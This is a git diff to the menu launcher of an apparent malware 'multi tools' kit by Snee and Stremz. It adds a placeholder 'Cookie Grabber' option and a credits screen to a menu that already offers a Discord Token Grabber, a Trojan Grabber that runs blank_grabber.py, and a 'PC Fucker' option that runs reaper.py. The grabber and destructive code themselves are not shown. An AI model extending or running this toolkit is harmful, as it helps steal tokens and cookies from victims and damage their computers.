@@ -3,7 +3,7 @@ import json
 from datetime import date
 from requests import get, post
 from random import randint
-import subprocess
+import time
 from colorama import Fore, Style, init
 from data.scripts.discord_tools import dc_tools
 from data.scripts.tutorial import tuto
@@ -78,6 +78,7 @@ def grabbers():
   [1] Discord Token Grabber
   [2] Ultimate Grabber
   [3] Trojan Grabber
+  [4] Cookie Grabber
   [0] Back
   """)
   USER_OPTION2 = input(bcolors.OKBLUE +    "[>] ")
@@ -93,6 +94,11 @@ def grabbers():
   elif USER_OPTION2 == "3":
        clearcmd()
        os.system('python ./data/grabber_scripts/blank_grabber.py')
+  elif USER_OPTION2 == "4":
+       clearcmd()
+       input("currently in development, press enter to restart...")
+       clearcmd()
+       grabbers()
 
 def zyzz():
   print(bcolors.OKBLUE + "Today's date:",today)
@@ -113,6 +119,7 @@ def zyzz():
     [3] Tutorial
     [4] Additional Functions
     [5] PC Fucker (will fuck ur pc)
+    [6] Credits
     """)
   USER_OPTION = input(bcolors.OKBLUE +    "[>] ")
   if USER_OPTION == "1":
@@ -130,5 +137,23 @@ def zyzz():
   elif USER_OPTION == "5":
     clearcmd()
     os.system('python ./modules/reaper.py')
+  elif USER_OPTION == "6":
+    clearcmd()
+    print("""
+    multi tools - a project by Snee and Stremz
+    github.com/itssnee
+    github.com/itsstremz
+    dev who is allowed to resell or reuse the code as his own:
+    github.com/itssens
+    """)
+    time.sleep(2.00)
+    input("to restart the program, press enter.")
+    clearcmd()
+    zyzz()
 zyzz()
-#made by Snee and Stremz, github.com/itssnee/multi-tools
+#made by snee the goat
+#we love snee
+#snee is smash
+#snee is king
+#github.com/itssnee
+#github.com/itssnee/multi-tools
